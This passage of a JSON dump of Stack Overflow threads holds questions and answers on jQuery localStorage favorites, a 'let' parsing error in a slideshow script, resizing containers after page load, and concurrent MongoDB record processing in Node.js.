$('#removeFavorite').show();\n    $('#removeFavoriteStar').show();\n  } else {\n    removeAsFavorite(item);\n    $('#addFavorite').show();\n    $('#addFavoriteStar').show();\n    $('#removeFavorite').hide();\n    $('#removeFavoriteStar').hide();\n  }\n  $('#addFavorite, #addFavoriteStar').click(function(e){\n    e.preventDefault();\n    if (debug) { console.log('adding item as a favorite'); }\n\n    // Update localStorage\n    setAsFavorite(item);\n\n    // Update class\n    $('#itm{{ dynamic_page_hubdb_row.hs_id }}').addClass('isFavorite');\n      $('#addFavorite').hide();\n    $('#addFavoriteStar').hide();\n    $('#removeFavorite').show();\n    $('#removeFavoriteStar').show();\n\n    // Trigger modal\n    $('#myModal').modal('show');\n\n    return false;\n  });\n  $('#removeFavorite, #removeFavoriteStar').click(function(e){\n    e.preventDefault();\n    if (debug) { console.log('removing item from favorites'); }\n\n    // Update localStorage\n    removeAsFavorite(item);\n\n    // Update class\n    $('#itm{{ dynamic_page_hubdb_row.hs_id }}').removeClass('isFavorite');\n    $('#addFavorite').show();\n    $('#addFavoriteStar').show();\n    $('#removeFavorite').hide();\n    $('#removeFavoriteStar').hide();\n\n    return false;\n  });\n});\n\nfunction favInit(){\n  // Get the existing favorites from localStorage\n  var favs = JSON.parse(localStorage.getItem('favorites'));\n  if (debug) { console.log('favInit-1 favorites: '+localStorage.getItem('favorites')); }\n  // If localStorage.favorites doesn't exists, create an empty array\n  if (favs != null &amp;&amp; Array.isArray(favs) &amp;&amp; favs.length){ } else {\n    if (debug) { console.log('no favorites found in local storage. Creating an empty array'); }\n    favs = new Array; // setup an empty array\n    // Refresh local storage\n    localStorage.setItem(\"favorites\", JSON.stringify(favs));\n    // pull favs from local storage\n    favs = JSON.parse(localStorage.getItem('favorites'));\n  }\n\n  if (debug) { console.log('favInit-2 favorites: '); console.dir(favs); }\n\n  return favs;\n}\n\nfunction isFavorite(item,favs){\n  if (favs != null &amp;&amp; favs.length){\n    // Find the selected item in the favs array\n    var test = favs.find(x =&gt; x.id === item.id);\n    //var test = $.grep(favs, function(e){ return e.id == item.id; });\n    if (test != null){\n      if (debug) { console.log('item is already a favorite: '); console.dir(item); }\n      return true;\n    } else {\n      if (debug) { console.log('item is not a favorite.'); }\n      return false;\n    }\n  }\n}\n\nfunction setAsFavorite(item){\n  var favs = JSON.parse(localStorage.getItem('favorites'));\n  favs.push(item);\n  localStorage.setItem('favorites',JSON.stringify(favs));\n  if (debug) { console.log('favInit-1 favorites: '+localStorage.getItem('favorites')); console.dir(JSON.parse(localStorage.getItem('favorites'))) }\n}\n\nfunction removeAsFavorite(item){\n  removeAsFavoriteByID(item.id)\n}\n\nfunction removeAsFavoriteByID(id){\n  var favs = JSON.parse(localStorage.getItem('favorites'));\n  var idx = favs.findIndex(x =&gt; x.id === id);\n  delete favs[idx];\n  var favs = favs.filter(function (el) {\n    return el != null;\n  });\n  if (debug) { console.log('removeAsFavorite: '+favs); }\n  if (favs.length){\n    //console.log('favs does have a length');\n    localStorage.setItem('favorites',JSON.stringify(favs));\n  } else {\n    //console.log('favs has no length');\n    localStorage.setItem('favorites',JSON.stringify(new Array));\n  }\n  if (debug) { console.log('favInit-1 favorites: '+localStorage.getItem('favorites')); console.dir(JSON.parse(localStorage.getItem('favorites'))) }\n}\n\nif (debug){\n  $('.product-ctas').append( '&lt;a href=\"#\" class=\"clearFavorites\"&gt;clear favs&lt;/a&gt;' );\n  $('.product-ctas').on('click','.clearFavorites',function(e){\n    e.preventDefault();\n    localStorage.removeItem('favorites');\n    alert('Favorites cleared');\n    return false;\n  });\n}\n</code></pre>\n\n<p>Here is my code for the favorites page:</p>\n\n<pre><code>var debug = true; // Set to true to output message to the error console\n$(document).ready(function() {\n  var favs = favInit();\n  displayFavorites('#favorites-list',favs);\n});\n\nfunction favInit(){\n  // Get the existing favorites from localStorage\n  var favs = JSON.parse(localStorage.getItem('favorites'));\n  if (debug) { console.log('favInit-1 favorites: '+localStorage.getItem('favorites')); }\n  // If localStorage.favorites doesn't exists, create an empty array\n  if (favs != null &amp;&amp; Array.isArray(favs) &amp;&amp; favs.length){ } else {\n    if (debug) { console.log('no favorites found in local storage. Creating an empty array'); }\n    favs = new Array; // setup an empty array\n    // Refresh local storage\n    localStorage.setItem(\"favorites\", JSON.stringify(favs));\n    // pull favs from local storage\n    favs = JSON.parse(localStorage.getItem('favorites'));\n  }\n\n  if (debug) { console.log('favInit-2 favorites: '); console.dir(favs); }\n\n  return favs;\n}\n\nfunction displayFavorites(containerID,array){\n  var $list = $('&lt;ul/&gt;'), id, item, image, title;\n  for (var i=0; i&lt;array.length; i++){\n    item = array[i];\n    if (debug) { console.log('item '+i+': '); console.dir(item); }\n\n    id = item.id;\n\n    $image = $('&lt;a/&gt;').attr('href',item.path).append( $('&lt;img/&gt;').attr('src',item.url).attr('title',item.name) );\n    $title = $('&lt;strong/&gt;').append( $('&lt;a/&gt;').attr('href',item.path).text(item.name) );\n    $list.append( $('&lt;li/&gt;').attr('id','itm'+id).append($image).append($title) );\n  }\n  $(containerID).html($list);\n}\n\nfunction removeAsFavoriteByID(id){\n  var favs = JSON.parse(localStorage.getItem('favorites'));\n  var idx = favs.findIndex(x =&gt; x.id === id);\n  delete favs[idx];\n  var favs = favs.filter(function (el) {\n    return el != null;\n  });\n  if (debug) { console.log('removeAsFavorite: '+favs); }\n  if (favs.length){\n    //console.log('favs does have a length');\n    localStorage.setItem('favorites',JSON.stringify(favs));\n  } else {\n    //console.log('favs has no length');\n    localStorage.setItem('favorites',JSON.stringify(new Array));\n  }\n  if (debug) { console.log('favInit-1 favorites: '+localStorage.getItem('favorites')); console.dir(JSON.parse(localStorage.getItem('favorites'))) }\n}\n</code></pre>\n"}, {"tags": ["javascript"], "comments": [{"owner": {"reputation": 796419, "user_id": 34397, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/7deca8ec973c3c0875e9a36e1e3e2c44?s=128&d=identicon&r=PG", "display_name": "SLaks", "link": "https://stackoverflow.com/users/34397/slaks"}, "edited": false, "score": 3, "creation_date": 1558554791, "post_id": 56264025, "comment_id": 99144465, "body": "Are you using a JS enginer that does not support <code>let</code>?"}, {"owner": {"reputation": 793711, "user_id": 19068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d2d3229ed1961d2bd81853242493247?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/19068/quentin"}, "edited": false, "score": 0, "creation_date": 1558554811, "post_id": 56264025, "comment_id": 99144469, "body": "<a href=\"https://jsbin.com/fitayinuhe/edit?html,js,output\" rel=\"nofollow noreferrer\">jsbin.com/fitayinuhe/edit?html,js,output</a> \u2014 I can&#39;t reproduce the problem. It isn&#39;t clear which of the many instances of <code>slide</code> the error is being thrown on. You haven&#39;t said which JS engines you&#39;ve tested with either."}, {"owner": {"reputation": 1522, "user_id": 2437278, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/cfd904b564cf00dc792cea62901c8660?s=128&d=identicon&r=PG", "display_name": "Casey", "link": "https://stackoverflow.com/users/2437278/casey"}, "edited": false, "score": 0, "creation_date": 1558554904, "post_id": 56264025, "comment_id": 99144506, "body": "You may want to look at a similar question I responded to here. Also, read the comments about pure functions: <a href=\"https://stackoverflow.com/a/55974603/2437278\">stackoverflow.com/a/55974603/2437278</a>"}, {"owner": {"reputation": 4480, "user_id": 7543162, "user_type": "registered", "accept_rate": 63, "profile_image": "https://i.stack.imgur.com/Ww9C6.png?s=128&g=1", "display_name": "oldboy", "link": "https://stackoverflow.com/users/7543162/oldboy"}, "edited": false, "score": 0, "creation_date": 1558554999, "post_id": 56264025, "comment_id": 99144541, "body": "what do u mean &quot;put an HTML element into a variable&quot;? can you give us an example"}, {"owner": {"reputation": 91, "user_id": 8819895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5bf99ed3cb6a44a79f63b1bb7e4d8556?s=128&d=identicon&r=PG&f=1", "display_name": "mattemyo", "link": "https://stackoverflow.com/users/8819895/mattemyo"}, "edited": false, "score": 0, "creation_date": 1558555000, "post_id": 56264025, "comment_id": 99144543, "body": "Could it be your eslint configuration that is messing stuff up? If you comment out this part of your code and paste it in your browser console when you have your html on the page, does it work?"}, {"owner": {"reputation": 1, "user_id": 11541418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9bd3df5a671bebcebbe49ebf98d74ffd?s=128&d=identicon&r=PG&f=1", "display_name": "shadowboii__", "link": "https://stackoverflow.com/users/11541418/shadowboii"}, "reply_to_user": {"reputation": 796419, "user_id": 34397, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/7deca8ec973c3c0875e9a36e1e3e2c44?s=128&d=identicon&r=PG", "display_name": "SLaks", "link": "https://stackoverflow.com/users/34397/slaks"}, "edited": false, "score": 0, "creation_date": 1558555876, "post_id": 56264025, "comment_id": 99144933, "body": "@SLaks what do you mean by that?"}, {"owner": {"reputation": 793711, "user_id": 19068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d2d3229ed1961d2bd81853242493247?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/19068/quentin"}, "edited": false, "score": 0, "creation_date": 1558555947, "post_id": 56264025, "comment_id": 99144966, "body": "&quot;It does work completely fine, but if i try to validate it&quot; \u2014 Define &quot;validate&quot; in this context."}, {"owner": {"reputation": 641, "user_id": 2951143, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/CLyzf.jpg?s=128&g=1", "display_name": "James", "link": "https://stackoverflow.com/users/2951143/james"}, "edited": false, "score": 0, "creation_date": 1558556017, "post_id": 56264025, "comment_id": 99145005, "body": "Can you post the HTML as well? it&#39;s quite difficult without having it."}, {"owner": {"reputation": 1, "user_id": 11541418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9bd3df5a671bebcebbe49ebf98d74ffd?s=128&d=identicon&r=PG&f=1", "display_name": "shadowboii__", "link": "https://stackoverflow.com/users/11541418/shadowboii"}, "reply_to_user": {"reputation": 793711, "user_id": 19068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d2d3229ed1961d2bd81853242493247?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/19068/quentin"}, "edited": false, "score": 0, "creation_date": 1558556436, "post_id": 56264025, "comment_id": 99145186, "body": "@Quentin It doesn&#39;t output error messages, but in an online validator it shows error messages"}, {"owner": {"reputation": 793711, "user_id": 19068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d2d3229ed1961d2bd81853242493247?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/19068/quentin"}, "edited": false, "score": 0, "creation_date": 1558556540, "post_id": 56264025, "comment_id": 99145249, "body": "@shadowboii__ \u2014 &quot;an online validator&quot; \u2026 <b>which</b> online validator?"}, {"owner": {"reputation": 793711, "user_id": 19068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d2d3229ed1961d2bd81853242493247?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/19068/quentin"}, "reply_to_user": {"reputation": 641, "user_id": 2951143, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/CLyzf.jpg?s=128&g=1", "display_name": "James", "link": "https://stackoverflow.com/users/2951143/james"}, "edited": false, "score": 0, "creation_date": 1558556562, "post_id": 56264025, "comment_id": 99145264, "body": "@James \u2014 Why would the HTML help? The OP already said the code works. It&#39;s just some unspecified tool that says there is a problem."}, {"owner": {"reputation": 1, "user_id": 11541418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9bd3df5a671bebcebbe49ebf98d74ffd?s=128&d=identicon&r=PG&f=1", "display_name": "shadowboii__", "link": "https://stackoverflow.com/users/11541418/shadowboii"}, "reply_to_user": {"reputation": 793711, "user_id": 19068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d2d3229ed1961d2bd81853242493247?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/19068/quentin"}, "edited": false, "score": 0, "creation_date": 1558556760, "post_id": 56264025, "comment_id": 99145364, "body": "@Quentin I think there is no issue, just the validators I used didn&#39;t use engines that support let as a variable. Thanks for your help"}], "answers": [{"tags": [], "owner": {"reputation": 1, "user_id": 11541418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9bd3df5a671bebcebbe49ebf98d74ffd?s=128&d=identicon&r=PG&f=1", "display_name": "shadowboii__", "link": "https://stackoverflow.com/users/11541418/shadowboii"}, "is_accepted": false, "score": -1, "last_activity_date": 1558557078, "creation_date": 1558557078, "answer_id": 56264578, "question_id": 56264025, "link": "https://stackoverflow.com/questions/56264025/what-is-the-correct-way-to-put-a-html-element-into-a-variable/56264578#56264578", "title": "What is the correct way to put a HTML element into a variable?", "body": "<p>Ok thanks everyone for your help, there wasn't really an issue, I'm just new to JS and didn't know something.</p>\n\n<p>I used a validator, that didn't use an engine, that supports let variables.</p>\n"}], "owner": {"reputation": 1, "user_id": 11541418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9bd3df5a671bebcebbe49ebf98d74ffd?s=128&d=identicon&r=PG&f=1", "display_name": "shadowboii__", "link": "https://stackoverflow.com/users/11541418/shadowboii"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 69, "favorite_count": 1, "answer_count": 1, "score": -1, "last_activity_date": 1558557078, "creation_date": 1558554708, "last_edit_date": 1558556349, "question_id": 56264025, "link": "https://stackoverflow.com/questions/56264025/what-is-the-correct-way-to-put-a-html-element-into-a-variable", "title": "What is the correct way to put a HTML element into a variable?", "body": "<p>I need this code for an automated slideshow on a page.\nI have tried changing up the variables.</p>\n\n<p>HTML\nJavaScript</p>\n\n<pre><code>&lt;img class=\"container\" id=\"c1\" &gt; \n&lt;img class=\"container\" id=\"c2\"&gt; \n&lt;img class=\"container\" id=\"c3\"&gt;\n&lt;p class=\"dot\" id=\"d3\"&gt;&lt;/p&gt;\n&lt;p class=\"dot\" id=\"d2\"&gt;&lt;/p&gt;\n&lt;p class=\"dot\" id=\"d1\"&gt;&lt;/p&gt;\n\n\nvar i;\nlet slide;\nlet dot;\n\nfunction plusSlide()\n{\n    for (i = 3; i &gt;= 0; i--)\n    {\n      slide = document.getElementById(\"c\" + i);\n      dot   = document.getElementById(\"d\" + i);\n\n      if (i == 3)\n      {\n        slide.id = \"c\" + 0;\n        dot.id   = \"d\" + 0;\n      }\n      else\n      {\n        slide.id = \"c\" + (i + 1);\n        dot.id   = \"d\" + (i + 1);\n      }\n    }\n\n  setTimeout(plusSlide, 5000);\n}\n\nplusSlide();\n</code></pre>\n\n<p>The result is correct, but at the variables it says: <code>Parsing Error: Unexpected Token slide</code></p>\n\n<p>Ok so I am using this for a slideshow with three slides, <code>c</code> are the pictures and <code>d</code> are the dots, I am taking the elements with these <code>ids</code> and I am changing them. I use <code>CSS</code> so only <code>#c1</code> is displayed.</p>\n\n<p>It does work completely fine, but if i try to validate it it shows me an error message at row 2 and 3.</p>\n"}, {"tags": ["javascript", "jquery"], "comments": [{"owner": {"reputation": 2654, "user_id": 1805822, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/zrywE.png?s=128&g=1", "display_name": "ggdx", "link": "https://stackoverflow.com/users/1805822/ggdx"}, "edited": false, "score": 0, "creation_date": 1558555409, "post_id": 56264009, "comment_id": 99144739, "body": "It is probably calculating before the page has finished rendering, i.e. before the images have loaded in. You need to fire an event after the page has actually rendered fully with your rejiggling as a callback"}, {"owner": {"reputation": 375, "user_id": 9980945, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3413c9503240ae7a06f0a62089601218?s=128&d=identicon&r=PG&f=1", "display_name": "KYSSE", "link": "https://stackoverflow.com/users/9980945/kysse"}, "reply_to_user": {"reputation": 2654, "user_id": 1805822, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/zrywE.png?s=128&g=1", "display_name": "ggdx", "link": "https://stackoverflow.com/users/1805822/ggdx"}, "edited": false, "score": 0, "creation_date": 1558555708, "post_id": 56264009, "comment_id": 99144860, "body": "yeah &quot;on load&quot; should of covered that tho.. Also its the last thing loaded in the dom already (the script)"}, {"owner": {"reputation": 2654, "user_id": 1805822, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/zrywE.png?s=128&g=1", "display_name": "ggdx", "link": "https://stackoverflow.com/users/1805822/ggdx"}, "edited": false, "score": 1, "creation_date": 1558555839, "post_id": 56264009, "comment_id": 99144913, "body": "No, on load is just that. The page itself as a document but it relies on assets not part of the page. What you are seeing is effectively a text file, interpreted as images, stylings, etc, etc from parsers in browser. The page has loaded as a text document (HTML is a text document) does not necessarily mean the 500 HTTP requests you&#39;ll be making for the images, fonts, CSS, JS, etc, etc. will be at that time. For a cheap, really shitty hack, <code>setTimeout(() =&gt; { &#47;&#47; resizing in here }, 0)</code> should do it."}, {"owner": {"reputation": 375, "user_id": 9980945, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3413c9503240ae7a06f0a62089601218?s=128&d=identicon&r=PG&f=1", "display_name": "KYSSE", "link": "https://stackoverflow.com/users/9980945/kysse"}, "reply_to_user": {"reputation": 2654, "user_id": 1805822, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/zrywE.png?s=128&g=1", "display_name": "ggdx", "link": "https://stackoverflow.com/users/1805822/ggdx"}, "edited": false, "score": 0, "creation_date": 1558577804, "post_id": 56264009, "comment_id": 99150345, "body": "If i set the timeout to any number between 0 - 500 the code works but doesnt solve my problem. If i set the timeout to like 600+ it doesnt work at all."}, {"owner": {"reputation": 375, "user_id": 9980945, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3413c9503240ae7a06f0a62089601218?s=128&d=identicon&r=PG&f=1", "display_name": "KYSSE", "link": "https://stackoverflow.com/users/9980945/kysse"}, "reply_to_user": {"reputation": 2654, "user_id": 1805822, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/zrywE.png?s=128&g=1", "display_name": "ggdx", "link": "https://stackoverflow.com/users/1805822/ggdx"}, "edited": false, "score": 0, "creation_date": 1558634568, "post_id": 56264009, "comment_id": 99175352, "body": "Hi guys! I made a JS fiddle here: <a href=\"https://jsfiddle.net/nLv0xt52/1/embedded/result/\" rel=\"nofollow noreferrer\">jsfiddle.net/nLv0xt52/1/embedded/result</a>  Which has the same problem."}], "answers": [{"comments": [{"owner": {"reputation": 383, "user_id": 4036310, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-vqd5suDBZak/AAAAAAAAAAI/AAAAAAAAAM0/HOAUlk0pqps/photo.jpg?sz=128", "display_name": "Will Silveira", "link": "https://stackoverflow.com/users/4036310/will-silveira"}, "edited": false, "score": 1, "creation_date": 1558556047, "post_id": 56264310, "comment_id": 99145015, "body": "Or use the &#39;wrong way&#39; with setTimeout as @ggdx mentioned"}, {"owner": {"reputation": 375, "user_id": 9980945, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3413c9503240ae7a06f0a62089601218?s=128&d=identicon&r=PG&f=1", "display_name": "KYSSE", "link": "https://stackoverflow.com/users/9980945/kysse"}, "edited": false, "score": 0, "creation_date": 1558577832, "post_id": 56264310, "comment_id": 99150351, "body": "Both ggdx&#39;s timeout suggestion and this answer are not working for me unfortunately."}, {"owner": {"reputation": 375, "user_id": 9980945, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3413c9503240ae7a06f0a62089601218?s=128&d=identicon&r=PG&f=1", "display_name": "KYSSE", "link": "https://stackoverflow.com/users/9980945/kysse"}, "edited": false, "score": 0, "creation_date": 1558628332, "post_id": 56264310, "comment_id": 99172774, "body": "That&#39;s a brilliant approach. It still doesnt work however. There must be something else wrong =/ its grabbing a size tho its just wrong one. Confusing."}, {"owner": {"reputation": 375, "user_id": 9980945, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3413c9503240ae7a06f0a62089601218?s=128&d=identicon&r=PG&f=1", "display_name": "KYSSE", "link": "https://stackoverflow.com/users/9980945/kysse"}, "edited": false, "score": 0, "creation_date": 1558634577, "post_id": 56264310, "comment_id": 99175356, "body": "I made a JS fiddle here: <a href=\"https://jsfiddle.net/nLv0xt52/1/embedded/result/\" rel=\"nofollow noreferrer\">jsfiddle.net/nLv0xt52/1/embedded/result</a>  Which has the same problem."}, {"owner": {"reputation": 383, "user_id": 4036310, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-vqd5suDBZak/AAAAAAAAAAI/AAAAAAAAAM0/HOAUlk0pqps/photo.jpg?sz=128", "display_name": "Will Silveira", "link": "https://stackoverflow.com/users/4036310/will-silveira"}, "reply_to_user": {"reputation": 375, "user_id": 9980945, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3413c9503240ae7a06f0a62089601218?s=128&d=identicon&r=PG&f=1", "display_name": "KYSSE", "link": "https://stackoverflow.com/users/9980945/kysse"}, "edited": false, "score": 0, "creation_date": 1558844007, "post_id": 56264310, "comment_id": 99231074, "body": "It seems to work in your fiddle, not? The only think that&#39;s breaking is the multiline text in my screen"}], "tags": [], "owner": {"reputation": 383, "user_id": 4036310, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-vqd5suDBZak/AAAAAAAAAAI/AAAAAAAAAM0/HOAUlk0pqps/photo.jpg?sz=128", "display_name": "Will Silveira", "link": "https://stackoverflow.com/users/4036310/will-silveira"}, "is_accepted": true, "score": 0, "last_activity_date": 1558578896, "last_edit_date": 1558578896, "creation_date": 1558555949, "answer_id": 56264310, "question_id": 56264009, "link": "https://stackoverflow.com/questions/56264009/make-an-empty-container-the-same-size-as-a-different-container-with-a-child-imag/56264310#56264310", "title": "Make an empty container the same size as a different container with a child image using JS", "body": "<p>Edit: Try to use the resizeDiv() when the user opens/hovers/clicks the menu, like:</p>\n\n<p>Like:</p>\n\n<pre class=\"lang-js prettyprint-override\"><code>\n$(\".quadmenu-dropdown-toggle\").on({\n    mouseenter: function (e) {\n      resizeDiv();\n    },\n    click: function(){\n      resizeDiv();\n    }\n});\n\n</code></pre>\n"}], "owner": {"reputation": 375, "user_id": 9980945, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3413c9503240ae7a06f0a62089601218?s=128&d=identicon&r=PG&f=1", "display_name": "KYSSE", "link": "https://stackoverflow.com/users/9980945/kysse"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 90, "favorite_count": 0, "accepted_answer_id": 56264310, "answer_count": 1, "score": 0, "last_activity_date": 1558578896, "creation_date": 1558554635, "last_edit_date": 1558555302, "question_id": 56264009, "link": "https://stackoverflow.com/questions/56264009/make-an-empty-container-the-same-size-as-a-different-container-with-a-child-imag", "title": "Make an empty container the same size as a different container with a child image using JS", "body": "<p><strong>Incorrect size:</strong> Here's what it looks like on load:</p>\n\n<p><a href=\"https://i.stack.imgur.com/wTUUV.jpg\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/wTUUV.jpg\" alt=\"enter image description here\"></a></p>\n\n<p><br><br>\n<strong>Correct size:</strong> Here's what it looks like on window resize:</p>\n\n<p><a href=\"https://i.stack.imgur.com/Kh0yA.jpg\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/Kh0yA.jpg\" alt=\"enter image description here\"></a></p>\n\n<p><br><br>\n<strong>PROJECT LINK</strong> Here is a reference link: <a href=\"https://wp.xingapps.win/\" rel=\"nofollow noreferrer\">https://wp.xingapps.win/</a></p>\n\n<p><strong>Instructions:</strong> Hover over \"Shop Ejuice\" black button in top navigation and you will see red boxes. These red boxes should match the height of the first image but arent.</p>\n\n<p><br><br>\n<strong>Story:</strong> I have a problem where im trying to reduce the amount of image requests on a page. I have a grid of images. Instead of loading all the images which are all the same height and width I am just going to load the first image and than the other images will be a <code>&lt;div&gt;</code> that matches the first images height and width. I will then apply a CSS Sprite background images to these <code>div</code>'s so they appear as normal images. This will reduce the amount of requests on the page by a lot!</p>\n\n<p><strong>Issue:</strong> My example code is working when i resize the browser - it will match the height of the source image perfectly. However on initial load the height and width are incorrect. For some reason a bit smaller than it should be. Not fixed until i resize the window. How do i fix this?<br><br></p>\n\n<p><strong>The code:</strong> </p>\n\n<pre><code>(function($){\n/* Match Quad Menu Div Height to one image */\nvar imgContainer = $('.mad-hat-parent-menu .quadmenu-product-float'),\n    sourceImg = $('li#menu-item-15959 span.quadmenu-item-content');\n\nfunction resizeDiv () {\n    imgContainer.height(sourceImg.width());\n    imgContainer.width(sourceImg.width());\n}\n\n$(window).on(\"load resize\", function() { resizeDiv(); });\n\n})(jQuery);\n</code></pre>\n\n<p><strong>Note:</strong> (i am actually targetting the container of the first image instead of the image itself)<br><br> Additionally <strong>this issue is hard to see if you are on a screen width smaller than 1650px</strong>.</p>\n"}, {"tags": ["javascript", "node.js", "concurrency"], "comments": [{"owner": {"reputation": 4755, "user_id": 3284355, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/eeUPu.jpg?s=128&g=1", "display_name": "Molda", "link": "https://stackoverflow.com/users/3284355/molda"}, "edited": false, "score": 1, "creation_date": 1558555467, "post_id": 56263994, "comment_id": 99144767, "body": "You should be able to go through all the records using <code>var stream = collection.find().batchSize(3).stream()</code> function. Then you can read the batch of 3 records in data event <code>stream.on(&#39;data&#39;. fun....)</code> You can pause the stream and resume. This might help you <a href=\"http://www.davecooper.org/working-with-large-mongo-databases\" rel=\"nofollow noreferrer\">davecooper.org/working-with-large-mongo-databases</a>"}], "answers": [{"tags": [], "owner": {"reputation": 105033, "user_id": 5260024, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XxSHe.jpg?s=128&g=1", "display_name": "Jonas Wilms", "link": "https://stackoverflow.com/users/5260024/jonas-wilms"}, "is_accepted": false, "score": 0, "last_activity_date": 1558558862, "last_edit_date": 1558558862, "creation_date": 1558557146, "answer_id": 56264594, "question_id": 56263994, "link": "https://stackoverflow.com/questions/56263994/node-js-controllable-concurrent-while-loop/56264594#56264594", "title": "Node.js: Controllable concurrent while loop", "body": "<p>You can use mongodb's cursor to asynchronously iterate over all records. For having three workers working on it, wrap the task into an async function and call that multiple times:</p>\n\n<pre><code> const cursor = db.collection(\"records\").find({});\n\n async function process() {\n   while(await cursor.hasNext()) {\n     const record = await cursor.next();\n     //...\n   }\n }\n\n await Promise.all([ process(), process(), process() ]);\n</code></pre>\n\n<p><em>(I'm not sure wether the mongodb driver supports concurrent calls to <code>.next()</code> though, you should test that)</em></p>\n\n<hr>\n\n<p>Otherwise this Semaphore implementation might help:</p>\n\n<pre><code> function Semaphore(count = 1) {\n  const resolvers = [];\n  let startCount = count;\n\n   return {\n     aquire() {\n       return new Promise(resolve =&gt; {\n         if(startCount) { resolve(); startCount -= 1; }\n         else resolvers.push(resolve);\n       });\n     },\n     free() { \n       if(resolvers.length) resolvers.pop()(); \n       else startCount += 1;\n     },\n     async use(cb) { \n       await this.aquire(); \n       await cb(); \n       this.free() \n     },\n     async done() {\n       await Promise.all(Array.from({ length: count }, () =&gt; this.aquire()));\n       startCount = count;\n     },\n   };\n }\n</code></pre>\n\n<p><a href=\"https://jsbin.com/konelopita/edit?console\" rel=\"nofollow noreferrer\">Running Demo</a> \nIn your case it is usable as:</p>\n\n<pre><code> const connectionSemaphore = Semaphore(3);\n\n (async fuction() {\n    while(await cursor.hasNext()) {\n      const record = await cursor.next();\n      /*await*/ connectionSemaphore.use(async () =&gt; {\n        // Do connection stuff concurrently\n      });\n    }\n\n    await connectionSemaphore.done();\n })();\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 36858, "user_id": 1243641, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a70aa9d494bf438c8b56aced999e897f?s=128&d=identicon&r=PG", "display_name": "Scott Sauyet", "link": "https://stackoverflow.com/users/1243641/scott-sauyet"}, "is_accepted": false, "score": 0, "last_activity_date": 1558563465, "creation_date": 1558563465, "answer_id": 56265709, "question_id": 56263994, "link": "https://stackoverflow.com/questions/56263994/node-js-controllable-concurrent-while-loop/56265709#56265709", "title": "Node.js: Controllable concurrent while loop", "body": "<p>I've had to do something like this twice recently.  My problem didn't involve that many records, and I needed to combine the results into a single data structure, but I think this could be a start toward what you're looking for.</p>\n\n<p>Generalizing those solutions gives me something like this:</p>\n\n<pre class=\"lang-js prettyprint-override\"><code>// processQueue :: ((Number -&gt; Promise [a]), Number, (a -&gt; b), (c, [b]) -&gt; c), c) -&gt; Promise c \nconst processQueue = (queue, count, process, combine, init) =&gt;\n  queue (count)\n    .then ( items =&gt; items .map (process) )\n    .then ( promises =&gt; Promise .all (promises) )\n    .then ( curr =&gt; curr .length\n      ? processQueue ( queue, count, process, combine, combine(init, curr) )\n      : combine (init, curr)\n    )\n</code></pre>\n\n<p>This takes five parameters:</p>\n\n<ul>\n<li><code>queue</code> is a function that takes a number and returns a promise for a list of values</li>\n<li><code>count</code> is a number</li>\n<li><code>process</code> is a function that converts one of those values into another type</li>\n<li><code>combine</code> is a function that combines a target type and a list of that second type into the target type</li>\n<li><code>init</code> is the starting value for the reducer</li>\n</ul>\n\n<p>It returns a promise for a value of that target type.</p>\n\n<p>I can't really demonstrate with your infrastructure, but it's not too hard to build up a simple example.  First, we can write a dummy <code>queue</code> function that returns promises for groups of up to <code>n</code> items until there are no more, and then a promise for an empty list.  Here's a silly version:</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre 